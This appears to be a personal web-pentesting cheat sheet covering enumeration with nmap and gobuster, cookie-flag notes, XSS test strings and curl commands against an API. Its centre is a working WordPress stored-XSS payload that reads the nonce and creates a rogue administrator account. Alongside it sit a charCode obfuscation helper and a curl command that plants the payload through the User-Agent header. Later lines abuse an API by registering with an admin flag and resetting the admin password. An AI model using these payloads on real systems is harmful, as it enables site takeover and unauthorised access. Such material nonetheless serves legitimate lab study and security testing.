sudo nmap -p80 --script=http-enum 192.168.x.1
https://www.wappalyzer.com/
robots.txt
sitemap.xml
HttpOnly prevents JavaScript
Secure requires https, if not present we could intercept traffic.
nonce prevents CSRF
https://www.revshells.com/

------------XSS------------
<script>alert(42)</script>
# Simple alert test
< > ' " { } ;
# Most common chars for possible XSS
https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script

=================================================================================
+-------------Retrieve Nonce Header and create new admin user
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
# above retrive nonce, below create admin user
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hackerman&email=hacker@man.com&pass1=password&pass2=password&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
+------------------------------------
# https://jscompress.com/ to make one liner and below code encode, using Console in DevMode and this code:
+------------------------------------
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
+-----------------------------------------
curl -i http://vulnerablesite.com --user-agent "<script>eval(String.fromCharCode(118,97,114,...109,115,41,59))</script>" --proxy 127.0.0.1:8080
# This curl command will post the XSS on the vulnerable WP module, then the admin runs it opening the plugin and giving us access. If we dont use burp we can remove --proxy
=================================================================================

gobuster dir -u 10.0.0.1 -w /usr/share/wordlists/dirb/common.txt -t 5
# -u URL
# -w Wordlist
# -t Number of concurrent threads (default 10).

gobuster dir -u http://192.168.1.1:55 -w /usr/share/wordlists/dirb/big.txt -p pattern
# Inside pattern file we need to use {GOBUSTER}/v1 to show what part is needed to fuzz


##############
## CURL
##############

# --proxy 127.0.0.1:8080 will pass it trhough burp suite

curl -d '{"password":"test1","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.1.1:55/users/v1/login
# will send json to API

curl -d '{"password":"test1","username":"admiin","email":"test@test.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.1.1:55/users/v1/register
# can try to Register a new user direct into the API, with admin flag as true

curl -d '{"password":"test1","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.1.1:55/users/v1/login
# log into the API to receive a token

curl -X 'PUT' 'http://192.168.1.1:55/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiO...aRUAsgA4' -d '{"password": "xpto"}'
# uses PUT method to change admin password, with a valid admin type token

